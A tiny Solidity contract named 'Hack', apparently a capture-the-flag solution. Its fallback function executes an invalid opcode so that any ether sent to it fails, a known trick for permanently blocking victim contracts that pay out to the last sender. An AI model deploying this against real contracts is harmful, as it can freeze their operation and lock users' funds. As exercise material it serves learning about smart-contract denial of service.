// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

contract Hack {
    fallback() external payable {
        assembly {
            invalid()
        }
    }
}